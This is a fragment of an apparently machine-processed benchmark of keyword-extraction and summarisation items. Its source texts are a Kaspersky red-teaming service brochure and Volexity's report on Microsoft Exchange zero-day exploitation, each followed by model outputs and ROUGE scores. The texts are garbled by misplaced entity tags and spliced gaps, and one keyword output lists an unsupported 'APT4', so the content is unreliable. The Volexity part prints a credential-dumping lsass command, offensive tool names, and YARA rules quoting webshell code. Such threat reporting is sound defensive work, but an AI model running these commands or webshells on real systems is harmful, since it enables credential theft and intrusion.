intruder.27Service highlightsThe Service is designed to reveal security shortcomings which could be exploited to gain unauthorized access to critical network components . These may include:\u2022 Vulnerable network architecture , insufficient network protection\u2022 [ORG] Vulnerabilities leading to network traffic\u2022interception and redirection Insufficient authentication and authorization in different services\u2022 [PERSON] Weak user credentials \u2022 Configuration flaws , including excessiveuser privileges\u2022 Vulnerabilities caused by errors inapplication code ( code injections , path traversal , client - side vulnerabilities , etc . ) \u2022 Vulnerabilities caused by using outdated hardware and software versions without the latest security updates Information disclosure\u2022Results are provided in a final report that includes detailed technical information on the testing process , results , vulnerabilities revealed and recommendations for remediation , as well as an executive summary outlining test results and illustrating attack vectors . [ORG] Videos and presentations for your technical team or top management can also be provided if required . About Kaspersky \u2019s approach to penetration testing Penetration testing emulates genuine hacker attacks , but you can rest assured that these tests are tightly controlled ; performed by [ORG] Kaspersky security experts with full regard of your systems \u2019 confidentiality , integrity and availability , and in strict adherence to international standards and best practices , including:\u2022 Penetration Testing Execution Standard ( PTES ) \u2022 NIST Special Publications 800 - 115 Technical Guide to Information Security Testingand Assessment\u2022 Open Source Security Testing Methodology Manual ( OSSTMM ) \u2022 Information Systems Security Assessment Framework ( [ORG] ISSAF ) \u2022 Web Application Security Consortium ( WASC ) Threat Classification \u2022 Open Web Application Security Project ( OWASP ) Testing Guide \u2022 Common Vulnerability Scoring System ( CVSS)Project team members are experienced professionals with deep , up - to - date practical knowledge of this field , acknowledged as expert security advisors by industry leaders including Oracle , [ORG] Google , [ORG] Apple , [ORG] Microsoft , Facebook , [PERSON] PayPal , [ORG] Siemens and [ORG] SAP.Delivery options Depending on the type of security assessment service , your systems specifics and working practices , security assessment services can be provided remotely or onsite . Most services can be performed remotely , and internal penetration testing can even be performed through [ORG] VPN access , while some services ( like wireless networks security assessment ) require an onsite presence . Kaspersky offers : [ORG] Red [ORG] Teaming The service includes [ORG] the [ORG] following:\u2022 [ORG] Threat [ORG] Intelligence . The service starts with a discussion of the customer \u2019s knownthreats and [ORG] Blue [ORG] Team \u2019s experience . The aim is to identify highly critical business assets and understand how project deliverables can be tailored towards TTPs used by the company \u2019s defense . However , during these discussions , [PERSON] Kaspersky will not request any information about the target resources , as [ORG] the [ORG] Red [ORG] Team will also conduct independent information gathering activities like real adversaries would do . The information gathering phase will include both analysis of publically available information ( open - source intelligence ) , and analysis of data available in underground communities.\u2022 [ORG] Adversary [ORG] Simulation . This stage starts with preparation of attack scenarios and tools based on the results of the Threat Intelligence stage . Preparation may include deep research into the systems used in the customer \u2019s environment to reveal new vulnerabilities , developing custom tools aimed at bypassing the customer \u2019s security systems , or readying spear - phishing attacks . When the preparation is complete , [PERSON] Kaspersky will perform the active phase of [ORG] Adversary [ORG] Simulation . These tests may include the following:\u2022 Passive information gathering , \u2022 Active information gathering ( network discovery ) , including port scanning , identifying available services and manual requests to certain services ( [ORG] DNS , [ORG] mail),\u2022 [ORG] External vulnerability scanning , and analyzing \u2022 Web application security ( using both automated and manual approaches ) to identifythe following types of vulnerabilities : \u2013 Code injection ( [ORG] SQL Injection , [ORG] OS [ORG] Commanding , etc . ) \u2013 Client - side vulnerabilities ( Cross - Site [ORG] Scripting , Cross - Site [ORG] Request [ORG] Forgery , etc . ) \u2013 Flaws in authentication and authorization \u2013 Insecure data storage \u2013 Other web application vulnerabilities leading to the threats listed in [FAC] WASCThreat [FAC] Classification v2.0 and OWASP Top Ten\u2022 Manual vulnerability analysis , including identification of resources withoutauthentication , important publically available information , insufficient access [ORG] control\u2022 [ORG] Guessing credentials [ORG] \u2022 [ORG] Social engineering testing [ORG] \u2022 [ORG] Exploitation [ORG] of [ORG] one or more of the vulnerabilities found and privilege escalation(if possible)28\u2022 Develop an attack using the obtained privileges and techniques listed above untilthe Service Provider can access the [ORG] LAN or important network resources ( e.g. [WORK_OF_ART] Active [WORK_OF_ART] Directory domain controller , business systems , DBMSes , etc . ) or until all attack methods available during testing have been exhausted . WeaponizeExploitExecuteReconDeliverControlMaintainFigure [CARDINAL] 22 : Adversary simulationThe above tests are carried out according to the prepared customer - specific scenarios , using special techniques to evade detection from [ORG] the [ORG] Blue [ORG] Team . Once [ORG] the [ORG] Red [ORG] Team has accomplished all its objectives , activities that trigger incident detection and response are carried out to ensure [ORG] Blue [ORG] Team involvement in [ORG] the [ORG] exercise.\u2022 [ORG] Report [ORG] Preparation . During this stage , [PERSON] Kaspersky will analyze the Adversary Simulation results , prepare a report with detailed description of the attacks ( including timestamps and indicators of compromise ) and recommendations.\u2022 [ORG] Testing [ORG] Results [ORG] Overview . A post - assessment workshop with the company \u2019s [ORG] Blue [ORG] Team can be arranged to discuss the project results , reasons for anything not detected or prevented , and possible further defense improvements . Approach and [ORG] Methodology [ORG] Red [ORG] Teaming has much in common with a real hacker attack and makes it possible to assess the effectiveness of the protection measuresin practice . However , unlike a hacker attack , the service is performed by experienced security experts from [PERSON] Kaspersky who take special care of system confidentiality , integrity and availability in strict adherence to the following international standards and best practices:\u2022 Penetration Testing Execution Standard ( PTES ) \u2022 NIST Special Publications 800 - 115 Technical Guide to Information Security Testingand Assessment\u2022 Open Source Security Testing Methodology Manual ( OSSTMM ) \u2022 Information Systems Security Assessment Framework ( [ORG] ISSAF ) \u2022 Web Application Security Consortium ( WASC ) \u2022 Threat Classification Open Web Application Security Project ( OWASP ) \u2022 Testing Guide Common Vulnerability Scoring System ( CVSS ) \u2022 And other standards , depending on your organization \u2019s business and locationThe analysis is performed using automated tools as well as manually by experts . The following security assessment tools can be used : Information gathering tools ( [ORG] Maltego , theHarvester and others)\u2022 \u2022 Various general - purpose and specialized scanners ( [ORG] NMap , [ORG] MaxPatrol , Nessus , Acunetics [ORG] WVS , nbtscan and others)\u2022 [NORP] Complex security assessment solutions ( [PERSON] Kali [PERSON] Linux ) \u2022 Credentials guessing tools ( [PERSON] Hydra , ncrack , [PERSON] Bruter , and others ) \u2022 [ORG] Specialized solutions for web application security assessment ( OWASP dirbuster , BurpSuite , [ORG] ProxyStrike , various plug - ins for [ORG] Mozilla [ORG] Firefox)\u2022 [ORG] Network traffic analyzers ( [ORG] Wireshark , Cain and Abel ) \u2022 Credentials extraction and management tools ( Mimikatz , WCE , pwdump and others ) \u2022 [ORG] Specialized tools for various types of attacks ( Yersinia , [GPE] Loki , [ORG] Responder , [ORG] SIPViciousand others)\u2022 Disassembling and debugging tools ( [ORG] IDA [ORG] Pro , [ORG] OllyDbg ) \u2022 And others , including limited access exploits and custom exploitation toolsdeveloped by the Service Provider.29For Red Teaming to be legal and safe , the customer must provide a point of contact ( a representative ) for all project communications , including scope negotiations and , resolving access issues , as well as giving confirmation for active works . The representative must be an official employee of the customers with an e - mail address belonging to the customer \u2019s domain name ( not a [ORDINAL] third - party intermediary).The confidentiality , integrity and availability of your [ORG] IR resources are our top priority . [ORG] Kaspersky \u2019s experts will take all necessary precautions to avoid any harm to your environment . All sensitive technical information related to the project ( important data , credentials , assessment results , etc . ) will be stored and transferred using strong encryption , and can be deleted on your request after the project has been completed . Our expert team members are experienced professionals in security assessment with deep knowledge of this field , constantly improving their skills . They have been acknowledged for their security research by such industry leaders as Oracle , [ORG] Google , [ORG] Apple , [ORG] Microsoft , Facebook , [PERSON] PayPal , [ORG] Siemens , [GPE] SAP , and others ( see section 7 for description of the project team ) . You can find resumes of the project team members in the attachment to this proposal . Outcome Following the service , customers receive a report containing the following:\u2022 High - level conclusions on the identified defensive capabilities , and recommendationsto improve them;\u2022 A detailed description of detected vulnerabilities , including severity level , exploitation complexity , possible impact on the vulnerable system , and evidence of the existence of vulnerabilities ( where possible);\u2022 A detailed description of activities ( including timestamps and indicatorsof compromise ) for analysis and improvement of the defensive team;\u2022 Recommendations for eliminating vulnerabilities ; [ORG] \u2022 [ORG] Recommendations on improving the incident response processes ; [ORG] \u2022 [ORG] Recommendations on mitigating the identified prevention and detection issues . [ORG] The [ORG] Red [ORG] Teaming [ORG] Testing [ORG] Service from [ORG] Kaspersky will help you evaluate the effectiveness of your monitoring capabilities and incident response procedures.30Why [ORG] Kaspersky?Because we have:\u2022 Partnerships with global law enforcement agencies such as [ORG] Interpol and [ORG] CERTs ; \u2022 Cloud - based tools monitoring [CARDINAL] millions of cyberthreats across the globe in real - time ; \u2022 Global teams analyzing and understanding internet threats of all kinds . Because we are:\u2022 The world \u2019s largest independent security software company , focused on [ORG] ThreatIntelligence and technology leadership;\u2022 The undisputed leader in more independent malware detection tests than any othervendor ; [ORG] Identified as Leader by [ORG] Gartner , [PERSON] Forrester and [PERSON] IDC.\u2022About [PERSON] Kaspersky [PERSON] Kaspersky is the world \u2019s largest privately held vendor of endpoint protection solutions . The company is ranked among the world \u2019s top [CARDINAL] four vendors of security solutions for endpoint users . Throughout its more than [DATE] 21 - year history , [PERSON] Kaspersky has remained an innovator in IT security and provides effective digital security solutions for enterprises , [ORG] SMBs and consumers . With its holding company registered in [GPE] the [GPE] United [GPE] Kingdom , Kaspersky operates in [CARDINAL] almost [CARDINAL] 200 countries and territories worldwide , providing protection for [CARDINAL] over [CARDINAL] 400 [CARDINAL] million users across the globe . Disclaimer . This document is not a public offer and is intended for introductory purposes only . The scope of the service can vary depending on it \u2019s availability in the specific geographical region . Some services described in the document require additional agreement with [PERSON] Kaspersky . For additional details , please contact [ORG] Kaspersky \u2019s regional representative or send your request to intelligence@kaspersky.com.31.IIS RIICyber Threats News : www.securelist.com IT Security News : business.kaspersky.com/www.kaspersky.com.D", "generated_text": "cybersecurity; organizations; SOCs; cybercrime; threats; organizations; lack; skilled staff; automation; orchestration; the SOC team; a system; data; threat intelligence; case studies; vendor processes; threat intelligence; tools; timestamps; compromise; network connections; organizations; the impact; an SOC; a holistic approach; a centralized function; continuous threat monitoring; analysis; response; mitigation; resiliency; the infrastructure; threats; data breaches; new vulnerabilities; Consistent response; analysis; threats; advanced threats; response procedures; endpoints; holes; Indicators; correlation; the effectiveness; organizations; The report; the key findings; the threat.", "ref_text": "<START-1>The document provides an overview of Kaspersky's cybersecurity services and solutions for security operations centers (SOCs). It discusses the increasing threats facing SOCs and the barriers to effective security, including lack of skills, automation, visibility, and too many alerts. Kaspersky offers security training, assessments, threat intelligence, advanced detection technologies, and incident response services. Its main product is Kaspersky CyberSecurity which has modules for endpoint protection, network monitoring, centralized management, and more. It analyzes threats and provides actionable intelligence on APTs, campaigns, vulnerabilities, and more. Kaspersky's solutions integrate with SIEMs and use techniques like machine learning and sandboxing to detect advanced threats. Its threat hunting, penetration testing, and red teaming identify hidden risks. The report highlights the need for trained security personnel, integration of technologies, threat intelligence, security automation, and full infrastructure visibility. It advises a proactive, intelligence-driven approach to running SOCs. Kaspersky aims to provide integrated solutions spanning prediction, prevention, detection, and response. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4281345565749235, "gpt3/lexical/rouge_rouge2": 0.11692307692307692, "gpt3/lexical/rouge_rougeL": 0.2018348623853211, "gpt3/lexical/rouge_rougeLsum": 0.2018348623853211, "gpt3_generated_text": ["The article discusses the importance of Security Operations Centers (SOCs) in combating cyber threats and protecting organizations. It highlights the increasing sophistication of cybercriminals and the need for organizations to continuously adapt and advance their SOC capabilities. The article mentions key findings from the Kaspersky Corporate IT Security Risks Survey in 2018, including the rising cost of data breaches and the increase in average security budgets. It also discusses the barriers that organizations face in establishing effective SOCs, such as a lack of skilled staff, insufficient automation and integration of tools, and a lack of enterprise-wide visibility. The article emphasizes the need for an intelligence-driven SOC that can predict, prevent, detect, and respond effectively to threats. It concludes by highlighting the importance of automation and integration, as well as the need for qualified specialists to interpret and analyze data from Security Information and Event Management (SIEM) systems. Overall, the article provides insights into the challenges and considerations organizations should take into account when establishing and operating an effective SOC."]}, {"split_name": "test", "sample_id": "test_110", "prompt_text": "Extract the keywords: [CARDINAL] 3/12/2021Operation Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilities | VolexityOperation Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilitiesvolexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilitiesMarch [CARDINAL] 2 , 2021by [PERSON] Josh [PERSON] Grunzweig , [PERSON] Matthew [PERSON] Meltzer , [PERSON] Sean [PERSON] Koessel , [PERSON] Steven [PERSON] Adair , Thomas Lancaster[UPDATE ] March 8 , [DATE] 2021 \u2013 Since original publication of this blog , Volexity has now observed that cyber espionage operations using the [ORG] SSRF vulnerability CVE-2021 - 26855 started occurring on [DATE] January [DATE] 3 , [DATE] 2021 , [DATE] three [DATE] days [DATE] earlier than initially posted . Volexity is seeing active in - the - wild exploitation of multiple [ORG] Microsoft [ORG] Exchange vulnerabilities used to steal e - mail and compromise networks . These attacks appear to have started [DATE] as [DATE] early [DATE] as [DATE] January 6 , [DATE] 2021.In [DATE] January [DATE] 2021 , through its Network Security Monitoring service , Volexity detected anomalous activity from [CARDINAL] two of its customers \u2019 [ORG] Microsoft [ORG] Exchange servers . Volexity identified a large amount of data being sent to [ORG] IP addresses it believed were not tied to legitimate users . A closer inspection of the [ORG] IIS logs from the [ORG] Exchange servers revealed rather alarming results . The logs showed inbound [ORG] POST requests to valid files associated with images , [ORG] JavaScript , cascading style sheets , and fonts used by Outlook Web Access ( OWA ) . It was initially suspected the servers might be backdoored and that webshells were being executed through a malicious HTTP module or [ORG] ISAPI filter . As a result , [ORG] Volexity started its incident response efforts and acquired system memory ( [ORG] RAM ) and other disk artifacts to initiate a forensics investigation . This investigation revealed that the servers were not backdoored and uncovered a zero - day exploit being used in the wild.url Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilities | VolexityThrough its analysis of system memory , Volexity determined the attacker was exploiting a zero - day server - side request forgery ( SSRF ) vulnerability in [ORG] Microsoft [ORG] Exchange ( CVE- [DATE] 2021 - 26855 ) . The attacker was using the vulnerability to steal the full contents of several user mailboxes . This vulnerability is remotely exploitable and does not require authentication of any kind , nor does it require any special knowledge or access to a target environment . The attacker only needs to know the server running [ORG] Exchange and the account from which they want to extract e - mail . Additionally , Volexity is providing alternative mitigations that may be used by defenders to assist in securing their [ORG] Microsoft [ORG] Exchange instances . This vulnerability has been confirmed to exist within the latest version of Exchange [DATE] 2016 on a fully patched [ORG] Windows [ORG] Server [DATE] 2016 server . Volexity also confirmed the vulnerability exists in Exchange [DATE] 2019 but has not tested against a fully patched version , although it believes they are vulnerable . It should also be noted that is vulnerability does not appear to impact Office 365.Following the discovery of CVE-2021 - 26855 , Volexity continued to monitor the threat actor and work with additional impacted organizations . During the course of multiple incident response efforts , Volexity identified that the attacker had managed to chain the [ORG] SSRF vulnerability with another that allows remote code execution ( RCE ) on the targeted [ORG] Exchange servers ( CVE-2021 - 27065 ) . In all cases of [ORG] RCE , [ORG] Volexity has observed the attacker writing webshells ( ASPX files ) to disk and conducting further operations to dump credentials , add user accounts , steal copies of [ORG] the [ORG] Active [ORG] Directory database ( NTDS.DIT ) , and move laterally to other systems and environments . A patch addressing both of these vulnerabilities is expected imminently . Authentication [ORG] Bypass [ORG] VulnerabilityWhile [ORG] Volexity can not currently provide full technical details of the exploit and will not be sharing proof - of - concept exploit code , it is still possible to provide useful details surrounding the vulnerability \u2019s exploitation and possible mitigations . Volexity observed the attacker focused on getting a list of e - mails from a targeted mailbox and downloading them . Based on these observations , it was possible for Volexity to further improve and automate attacks in a lab environment . There are [CARDINAL] two methods to download e - mail with this vulnerability , depending on the way that [ORG] Microsoft [ORG] Exchange has been configured . In corporate environments it is common that multiple Exchange servers will be set up . This is often done for load balancing , availability , and resource splitting purposes . While it is less common , it is also possible to run all [ORG] Exchange functionality on a single server . In the case where a single server is being used to provide the [ORG] Exchange service , Volexity believes the attacker must know the targeted user \u2019s domain security identifier ( [ORG] SID ) in order to access their mailbox . This is a static value and is not considered something secret . However , it is not something that is trivially obtained by someone without access to systems within a specific organization.url Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange [ORG] Vulnerabilities | [ORG] VolexityIn a multiple server configuration , where the servers are configured in [ORG] a [ORG] Database [ORG] Availability [ORG] Group ( [ORG] DAG ) , Volexity has proven an attacker does not need to acquire a user \u2019s domain [ORG] SID to access their mailbox . The only information required is the e - mail address of the user they wish to target . In order to exploit this vulnerability , the attacker must also identify the fully qualified domain name ( [ORG] FQDN ) of the internal [ORG] Exchange server(s ) . Using a series of requests , Volexity determined that this information could be extracted by an attacker with only initial knowledge of the external [ORG] IP address or domain name of a publicly accessible [ORG] Exchange server . After this information is obtained , the attacker can generate and send a specially crafted [ORG] HTTP [ORG] POST request to the [ORG] Exchange server with an XML SOAP payload to [ORG] the [ORG] Exchange [ORG] Web [ORG] Services ( EWS ) API endpoint . This SOAP request , using specially crafted cookies , bypasses authentication and ultimately executes the underlying request specified in the XML , allowing an attacker to perform any operation on the users \u2019 mailbox . Volexity has observed this attack conducted via [ORG] OWA . The exploit involved specially crafted [ORG] POST requests being sent to a valid static resources that does not require authentication . Specifically , Volexity has observed [ORG] POST requests targeting files found on the following web directory:/owa / auth / Current / themes / resources / This folder contains image , font , and cascading style sheet files . Using any of these files for the [ORG] POST request appears to allow the exploit to proceed . If a file such as /owa / auth / logon.aspx or simply a folder such as /owa / auth/ were to be used , the exploit will not work . Authentication [PERSON] Bypass [PERSON] Exploit [ORG] DemonstrationThe video below demonstrates the vulnerability being exploited in a lab environment : Figure [CARDINAL] 1 . Video demonstrating the authentication bypass vulnerability at work in a lab environment . In the video demonstration , the following SOAP XML payload is used to retrieve the identifiers of each email in Alice \u2019s inbox : url [WORK_OF_ART] Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilities | VolexityFigure 2 . XML payload used to pull email identifiers from [ORG] Alice \u2019s inbox without authentication . Then , the following payload is used to pull down each individual email : Figure [CARDINAL] 3 . Payload used to retrieve individual emails without authentication . Remote Code Execution [GPE] VulnerabilityAs mentioned in the introduction to this post , a remote code execution ( RCE ) exploit was also observed in use against multiple organizations . This RCE appears to reside within the use of [ORG] the Set - OabVirtualDirectory ExchangePowerShell cmdlet . Evidence of this activity can be seen in [ORG] Exchange \u2019s [ORG] ECP [ORG] Server logs . A snippet with the exploit removed is shown below.;\u2019S : CMD = Set - OabVirtualDirectory . ExternalUrl=\u201d<removed>\u201durl Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilities | [PERSON] VolexityIIS logs for the server would show an entry similar to what is shown below ; however , this URL path may be used for items not associated with this exploit or activity./ecp / DDI / DDIService.svc / SetObjectIn this case , this simple backdoor , which [ORG] Volexity has named [ORG] SIMPLESEESHARP , was then used to drop a larger webshell , named [ORG] SPORTSBALL , on affected systems . Further , Volexity has observed numerous other webshells in use , such as [ORG] China [ORG] Chopper variants and [PRODUCT] ASPXSPY.POST [PRODUCT] Exploitation [PRODUCT] ActivityWhile the attackers appear to have initially flown largely under the radar by simply stealing e - mails , they recently pivoted to launching exploits to gain a foothold . From Volexity \u2019s perspective , this exploitation appears to involve multiple operators using a wide variety of tools and methods for dumping credentials , moving laterally , and further backdooring systems . Below is a summary of the different methods and tools Volexity has observed thus far : Method / ToolPurposerundll32 [PERSON] C:\\windows\\system32\\comsvcs.dll [PERSON] MiniDump lsass.dmpDump process memory of lsass.exe to obtain credentialsPsExecProcDumpWindows Sysinternals tool used to execute commands on remote systemsWindows Sysinternals tool to dump process memoryWinRar Command Line [ORG] UtilityUsed archive data exfiltrationWebshells ( ASPX and PHP)Used to allow command execution or network proxying via external websitesDomain [PERSON] Account [PERSON] User [PERSON] AdditionLeveraged by attackers to add their own user account and grant it privileges to provide access in the futureIndicators of [ORG] CompromiseAuthentication [ORG] Bypass [ORG] IndicatorsIn [ORG] Volexity \u2019s observations of authentication bypass attacks being performed in the wild , files such as the following were the targets of [ORG] HTTP [ORG] POST requests : url [WORK_OF_ART] Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilities | Volexity / owa / auth / Current / themes / resources / logon.css /owa / auth / Current / themes / resources / owafont_ja.css /owa / auth / Current / themes / resources / lgnbotl.gif /owa / auth / Current / themes / resources / owafont_ko.css /owa / auth / Current / themes / resources / SegoeUI - SemiBold.eot /owa / auth / Current / themes / resources / SegoeUI - SemiLight.ttf /owa / auth / Current / themes / resources / lgnbotl.gifRemote Code Execution IndicatorsTo identify possible historical activity related to the remote code execution exploit , organizations can search their [ORG] ECP [ORG] Server logs for the following string ( or similar).S : CMD = Set - OabVirtualDirectory . ExternalUrl='ECP Server logs are typically located at < exchange install path>\\Logging\\ECP\\Server\\Webshell IndicatorsFurther , Volexity has observed indicators that are consistent with web server breaches that can be used to look on disk and in web logs for access to or the presence of ASPX files at the following paths:\\inetpub\\wwwroot\\aspnet_client\\ ( any .aspx \ufb01le under this folder or sub folders ) \\<exchange install [GPE] path>\\FrontEnd\\HttpProxy\\ecp\\auth\\ ( any \ufb01le besides \\<exchange install path>\\FrontEnd\\HttpProxy\\owa\\auth\\ ( any \ufb01le or modi\ufb01ed \ufb01le that is not part of a standard install ) \\<exchange install path>\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\<any aspx \ufb01le in this folder \\<exchange install path>\\FrontEnd\\HttpProxy\\owa\\auth\\<folder with version number>\\<any aspx \ufb01le in this folder or subfolders > It should be noted that Volexity has observed the attacker adding webshell code to otherwise legitimate ASPX files in an attempt to blend in and hide from defenders . Web Log User - AgentsThere are also a handful of [ORG] User - Agent that may be useful for responders to look for when examining their web logs . These are not necessarily indicative of compromise , but should be used to determine if further investigation . Volexity observed the following non - standard [ORG] User - Agents associated with [ORG] POST requests to the files found under folders within /owa / auth / Current.url Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilities | VolexityDuckDuckBot/1.0;+(+url facebookexternalhit/1.1+(+url Mozilla/5.0+(compatible;+Baiduspider/2.0;++url Mozilla/5.0+(compatible;+Bingbot/2.0;++url Mozilla/5.0+(compatible;+Googlebot/2.1;++url Mozilla/5.0+(compatible;+Konqueror/3.5;+Linux)+KHTML/3.5.5+(like+Gecko)+(Exabot- Thumbnails ) Mozilla/5.0+(compatible;+Yahoo!+Slurp;+url Mozilla/5.0+(compatible;+YandexBot/3.0;++url Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36 + ( KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36Volexity observed the following [ORG] User - Agents in conjunction with exploitation to /ecp/ python - requests/2.19.1 python - requests/2.25.1Further other notable [ORG] User - Agent entries tied to tools used for post - exploitation access to webshells.antSword / v2.1 Googlebot/2.1+(+url Mozilla/5.0+(compatible;+Baiduspider/2.0;++url Auth Bypass and [PRODUCT] RCE [PRODUCT] IndicatorsTo identify possible historical activity relating to the authentication bypass and RCE activity , IIS logs from [ORG] Exchange servers can be examined for the following : POST /owa / auth / [PERSON] Current/ [PERSON] POST /ecp / default.\ufb02t POST /ecp / main.css POST /ecp/<single char>.jsNote that the presence of log entries with [ORG] POST requests under these directories does not guarantee an [ORG] Exchange server has been exploited . However , its presence should warrant further investigation . [PERSON] Yara signatures for non trivial webshells deployed by attackers following successful exploitation may be found in the Appendix of this post . Network Indicators \u2013 [ORG] Attacker [ORG] IPsurl [ORG] Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilities | VolexityVolexity has observed numerous [ORG] IP addresses leveraged by the attackers to exploit the vulnerabilities described in this blog . These [ORG] IP addresses are tied to VPS servers and [ORG] VPN services . Volexity has also observed the attackers using [ORG] Tor , but has made attempts to to their targets , all in support of their mission and goals . These particular vulnerabilities in [ORG] Microsoft [ORG] Exchange are no exception . These attackers are conducting novel attacks to bypass authentication , including [CARDINAL] two - factor authentication , allowing them to access e- mail accounts of interest within targeted organizations and remotely execute code on vulnerable [ORG] Microsoft [ORG] Exchange servers . Due to the ongoing observed exploitation of the discussed vulnerabilities , Volexity urges organizations to immediately apply the available patches or temporarily disabling external access to [ORG] Microsoft [ORG] Exchange until a patch can be applied . Need Assistance?If you have concerns that your servers or networks may have been compromised from this vulnerability , please reach out to the Volexity team and we can help you make a determination if further investigation is warranted . Appendixurl Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilities | Volexityrule webshell_aspx_simpleseesharp : [PERSON] Webshell Unclassi\ufb01ed author= \u201c threatintel@volexity.com \u201d date= \u201c [DATE] 2021 - 03 - 01 \u201d description= \u201c A simple ASPX [PERSON] Webshell that allows an attacker to write further \ufb01les to $ [MONEY] header= \u201c < % @ Page Language=\\\u201dC#\\ \u201d % > \u201d $ [MONEY] body= \u201c < % HttpPostedFile thisFile = Request . Files[0];thisFile . SaveAs(Path . Combine \u201d condition : $ header at 0 and rule webshell_aspx_reGeorgTunnel : [ORG] Webshell [ORG] Commodity author= \u201c threatintel@volexity.com \u201d date= \u201c [DATE] 2021 - 03 - 01 \u201d description= \u201c variation on reGeorgtunnel \u201d reference= \u201c url \u201d strings : $ s1= \u201c [WORK_OF_ART] System . Net . Sockets \u201d $ [WORK_OF_ART] s2= \u201c [WORK_OF_ART] System . Text . Encoding . Default . GetString(Convert . FromBase64String(StrTr(Request . Headers . Get \u201d $ t1 = \u201c .Split(\u2018| \u2019 ) \u201d $ [MONEY] t2= \u201c Request . Headers . Get \u201d $ [MONEY] t3= \u201c .Substring ( \u201c $ t4= \u201c new [ORG] Socket ( \u201c $ [PERSON] t5= \u201c [ORG] IPAddress ip ; \u201d condition : all of ( $ [MONEY] s * ) or all of ( $ t * ) } url [WORK_OF_ART] Exchange Marauder : Active Exploitation of Multiple Zero - Day [ORG] Microsoft [ORG] Exchange Vulnerabilities | Volexityrule webshell_aspx_sportsball : [PERSON] Webshell author= \u201c threatintel@volexity.com \u201d date= \u201c [DATE] 2021 - 03 - 01 \u201d description= \u201c The [ORG] SPORTSBALL webshell allows attackers to upload \ufb01les or execute commands on the system . \u201d $ [ORG] uniq1= \u201c [ORG] HttpCookie newcook = new HttpCookie(\\\u201dfqrspt\\ \u201d , HttpContext . Current . Request . Form \u201d $ uniq2= \u201c ZN2aDAB4rXsszEvCLrzgcvQ4oi5J1TuiRULlQbYwldE= \u201d $ var1= \u201c [WORK_OF_ART] Result . InnerText = string . Empty ; \u201d $ var2= \u201c newcook . Expires = [ORG] DateTime . Now . AddDays ( \u201d $ var3= \u201c [WORK_OF_ART] System . Diagnostics . Process process = new System . Diagnostics . Process ( ) \u201d $ var4= \u201c process . StandardInput . WriteLine(HttpContext . Current . Request . Form[\\ \u201d \u201d $ var5= \u201c else if ( ! string . IsNullOrEmpty(HttpContext . Current . Request . Form[\\ \u201d \u201d $ [MONEY] var6= \u201c < input type=\\\u201dsubmit\\ \u201d value=\\\u201dUpload\\ \u201d / > \u201d condition : any of ( $ uniq * ) or all of ( $ var * ) } url", "generated_text": "cyber espionage; Operations; Exchange Marauder; January; 3; the wild; multiple zero-day Microsoft Exchange vulnerabilities; the SSRF vulnerability; CVE-2021-26855; the full contents; several user mailboxes; the vulnerability; remote code execution; RCE; webshells; JavaScript; the Exchange server; Microsoft Office; Office 365; a fully patched Windows Server 2016 server; 2019; the threat actor; defenders; the wild; activity; January; the - wild; the attacker; credentials; the Active Directory database; NTDS.DIT; further operations; credentials; a compromised Exchange instance; the Exchange server; compromise networks; the active Directory database; APT4; the attacker; a zero-day server-side request forgery; the SSRF vulnerability; the wild; the incidents; the wild; a defender; a zero-day; e-mail; compromise networks; The report; the activity; organizations; the activity; the zero-day exploit.", "ref_text": "<START-1>The PDF discusses active exploitation of multiple zero-day vulnerabilities in Microsoft Exchange servers that began in early January 2021. Attackers were using a server-side request forgery (SSRF) vulnerability (CVE-2021-26855) to steal emails without authentication and a remote code execution (RCE) vulnerability (CVE-2021-27065) to install web shells and move laterally. The SSRF vulnerability allows attackers to send crafted requests to download emails from targeted mailboxes without any authentication needed other than knowing the email address. Chaining this with the RCE vulnerability allowed attackers to execute arbitrary code on Exchange servers to install ASPX web shells, dump credentials, add user accounts, and steal AD databases. Volexity observed these vulnerabilities being exploited in the wild starting January 6, 2021. The attacks appear targeted for cyber espionage, conducted by multiple groups using varied tools for post-exploitation activities. Indicators of compromise are provided including suspicious user agents, URIs, and IP addresses associated with exploitation. Patches for the vulnerabilities are expected soon. Organizations are urged to apply them immediately or temporarily disable external Microsoft Exchange access given active in-the-wild attacks. The summary provides technical details on the vulnerabilities and associated attacker activities derived from incident response investigations and monitoring network traffic. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5301837270341208, "gpt3/lexical/rouge_rouge2": 0.22691292875989444, "gpt3/lexical/rouge_rougeL": 0.3359580052493438, "gpt3/lexical/rouge_rougeLsum": 0.3359580052493438, "gpt3_generated_text": ["The article discusses an ongoing cyber espionage operation called Operation Exchange Marauder that is actively exploiting multiple zero-day vulnerabilities in Microsoft Exchange. The operation involves the use of a zero-day server-side request forgery (SSRF) vulnerability (CVE-2021-26855) to steal the contents of user mailboxes. The vulnerability allows the attacker to remotely access the Exchange server without authentication and extract email data. The article also mentions another vulnerability (CVE-2021-27065) that the attacker has chained with the SSRF vulnerability to achieve remote code execution on the targeted Exchange servers. The attacker is observed writing webshells, dumping credentials, stealing the Active Directory database (NTDS.DIT), and moving laterally to other systems. The article states that a patch for both vulnerabilities is expected soon. The report advises defenders to implement mitigations to secure their Microsoft Exchange instances. The article also clarifies that the vulnerability does not impact Office 365. The operation was first detected in January 2021, and the article provides details of the attacker's activities and the potential impact on compromised Exchange instances."]}, {"split_name": "test", 